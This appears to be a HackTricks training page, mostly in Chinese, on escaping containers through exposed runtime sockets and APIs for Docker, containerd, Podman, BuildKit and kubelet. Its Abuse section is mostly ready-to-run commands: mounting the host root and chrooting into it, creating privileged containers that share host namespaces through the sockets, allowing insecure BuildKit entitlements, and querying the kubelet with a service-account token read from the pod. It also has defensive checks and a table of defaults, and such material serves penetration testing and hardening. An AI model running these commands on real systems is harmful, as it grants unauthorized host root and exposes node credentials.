# Runtime API And Daemon Exposure

{{#include ../../../banners/hacktricks-training.md}}

## 概述

许多真实的 container 妥协并不是从 namespace escape 开始的。它们往往始于对 runtime control plane 的访问。如果某个 workload 可以通过挂载的 Unix socket 或暴露的 TCP listener 与 `dockerd`、`containerd`、CRI-O、Podman 或 kubelet 通信，攻击者就可能请求创建一个权限更高的新 container、挂载主机文件系统、加入 host namespaces，或者获取敏感的节点信息。在这些情况下，runtime API 才是真正的安全边界，而攻破它在功能上几乎等同于攻破主机。

这也是为什么 runtime socket exposure 应该与 kernel protections 分开记录。即使一个 container 具有普通的 seccomp、capabilities 和 MAC confinement，只要 `/var/run/docker.sock` 或 `/run/containerd/containerd.sock` 被挂载到其中，它仍然可能只差一次 API 调用就能导致主机被攻破。当前 container 的 kernel isolation 也许完全按设计正常工作，而 runtime management plane 仍然是完全暴露的。

## Daemon Access Models

Docker Engine 传统上通过本地 Unix socket `unix:///var/run/docker.sock` 暴露其特权 API。历史上它也曾通过 TCP listeners 对外暴露，例如 `tcp://0.0.0.0:2375`，或者通过受 TLS 保护的 `2376` listener。没有强 TLS 和客户端认证就远程暴露 daemon，本质上会把 Docker API 变成一个远程 root 接口。

containerd、CRI-O、Podman 和 kubelet 也暴露了类似的高影响面。名称和工作流不同，但逻辑并没有变。如果这个接口允许调用者创建 workloads、挂载主机路径、获取凭据，或者修改正在运行的 containers，那么这个接口就是一个特权管理通道，应该按此对待。

需要检查的常见本地路径有：
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
较旧或更专用的 stack 也可能暴露诸如 `dockershim.sock`、`frakti.sock` 或 `rktlet.sock` 之类的 endpoints。这些在现代环境中不太常见，但一旦遇到，应以同样的谨慎对待，因为它们代表的是 runtime-control surfaces，而不是普通的 application sockets。

## Secure Remote Access

如果必须将 daemon 暴露到本地 socket 之外，连接应使用 TLS 进行保护，并且最好使用 mutual authentication，这样 daemon 会验证 client，而 client 也会验证 daemon。为了方便而把 Docker daemon 以明文 HTTP 方式开启，是 container administration 中最危险的错误之一，因为 API surface 足够强大，可以直接创建 privileged containers。

历史上的 Docker configuration pattern 看起来像这样：
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
在基于 systemd 的主机上，daemon 通信也可能显示为 `fd://`，这意味着进程继承的是来自 systemd 的一个预先打开的 socket，而不是由它自己直接绑定。重要的教训不是具体语法，而是安全后果。一旦 daemon 监听的范围超出了严格权限控制的本地 socket，传输安全和 client authentication 就不再是可选加固，而是必需项。

## Abuse

如果存在一个 runtime socket，确认它是哪一个，是否存在兼容的 client，以及是否可以直接访问原始 HTTP 或 gRPC：
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
These commands are useful because they distinguish between a dead path, a mounted but inaccessible socket, and a live privileged API. If the client succeeds, the next question is whether the API can launch a new container with a host bind mount or host namespace sharing.

### When No Client Is Installed

`docker`, `podman`, or another friendly CLI 的缺失并不意味着 socket 是安全的。Docker Engine 通过其 Unix socket 使用 HTTP 通信，而 Podman 通过 `podman system service` 同时暴露 Docker-compatible API 和 Libpod-native API。这意味着一个只包含 `curl` 的最小环境，仍然可能足以驱动 daemon：
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
这在 post-exploitation 期间很重要，因为 defenders 有时会移除常见的 client binaries，但仍然保留挂载着的 management socket。在 Podman 主机上，记住 rootful 和 rootless deployments 的高价值路径不同：rootful service instances 使用 `unix:///run/podman/podman.sock`，而 rootless ones 使用 `unix://$XDG_RUNTIME_DIR/podman/podman.sock`。

### Full Example: Docker Socket To Host Root

如果可以访问 `docker.sock`，经典的 escape 方法是启动一个新 container，挂载 host root filesystem，然后对其执行 `chroot`：
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
这通过 Docker daemon 提供直接的 host-root 执行。影响不只限于读取文件。一旦进入新的 container，攻击者可以修改 host 文件、收集凭证、植入 persistence，或启动更多特权 workload。

### Full Example: Docker Socket To Host Namespaces

如果攻击者更偏好进入 namespace，而不是仅限于 filesystem 访问：
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
该路径通过请求 runtime 创建一个新的容器，并显式暴露 host-namespace，而不是利用当前容器来到达主机。

### Full Example: containerd Socket

挂载的 `containerd` socket 通常同样危险：
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
如果存在更像 Docker 的客户端，`nerdctl` 可能比 `ctr` 更方便，因为它暴露了熟悉的标志，例如 `--privileged`、`--pid=host` 和 `-v`：
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
影响同样是主机 compromise。即使缺少 Docker-specific tooling，另一个 runtime API 仍可能提供相同的管理权限。在 Kubernetes 节点上，`crictl` 也可能足以用于 reconnaissance 和 container interaction，因为它直接与 CRI endpoint 通信。

### BuildKit Socket

`buildkitd` 很容易被忽视，因为人们常把它看作“只是构建后端”，但这个 daemon 仍然是一个特权 control plane。可访问的 `buildkitd.sock` 可以让攻击者执行任意 build steps、检查 worker capabilities、使用来自被 compromise 环境的本地 contexts，并在 daemon 配置允许时请求危险的 entitlements，例如 `network.host` 或 `security.insecure`。

有用的首次交互是：
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
如果 daemon 接受 build 请求，测试是否存在不安全的 entitlements：
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
具体影响取决于 daemon 配置，但一个带 root 权限且具有宽松 entitlements 的 BuildKit service 并不是无害的开发便利。应把它视为另一个高价值的管理面，尤其是在 CI runners 和共享 build nodes 上。

### Kubelet API Over TCP

kubelet 不是 container runtime，但它仍然是 node management plane 的一部分，并且通常也属于同一个 trust boundary 讨论。如果 kubelet 的 secure port `10250` 能从 workload 访问，或者 node credentials、kubeconfigs 或 proxy rights 被暴露，攻击者可能能够枚举 Pods、获取 logs，或者在 node-local containers 中执行命令，而完全不需要触碰 Kubernetes API server admission path。

从廉价的 discovery 开始：
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
如果 kubelet 或 API-server proxy path 授权了 `exec`，具备 WebSocket 能力的 client 就可以把它转化为在该 node 上其他 container 中的 code execution。这也是为什么只有 `get` permission 的 `nodes/proxy` 比听起来更危险：request 仍然可以到达会执行 commands 的 kubelet endpoint，而这些直接的 kubelet interactions 不会出现在普通的 Kubernetes audit logs 中。

## Checks

这些 checks 的目标是回答：container 是否能够访问任何本应始终位于 trust boundary 之外的 management plane。
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
这里有几点值得注意：

- 挂载的 runtime socket 通常是直接的 administrative primitive，而不只是信息泄露。
- `2375` 上的 TCP listener 如果没有 TLS，应当视为远程 compromise 条件。
- 像 `DOCKER_HOST` 这样的 environment variables，往往表明该 workload 是被有意设计为与 host runtime 通信的。

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | 默认是本地 Unix socket | `dockerd` 监听本地 socket，daemon 通常是 rootful | 挂载 `/var/run/docker.sock`，暴露 `tcp://...:2375`，`2376` 上 TLS 弱或缺失 |
| Podman | 默认无 daemon 的 CLI | 普通本地使用不需要长期存在的 privileged daemon；启用 `podman system service` 时，API sockets 仍可能被暴露 | 暴露 `podman.sock`，广泛运行该 service，rootful API 使用 |
| containerd | 本地 privileged socket | administrative API 通过本地 socket 暴露，通常由更高层工具使用 | 挂载 `containerd.sock`，广泛的 `ctr` 或 `nerdctl` 访问，暴露 privileged namespaces |
| CRI-O | 本地 privileged socket | CRI endpoint 仅供 node-local 的受信任组件使用 | 挂载 `crio.sock`，将 CRI endpoint 暴露给不受信任的 workloads |
| Kubernetes kubelet | node-local management API | kubelet 不应从 Pods 中被广泛访问；根据 authn/authz，访问可能暴露 pod state、credentials 和 execution features | 挂载 kubelet sockets 或 certs，kubelet auth 薄弱，host networking 加上可达的 kubelet endpoint |

## References

- [containerd socket exploitation part 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [Kubernetes API Server Bypass Risks](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
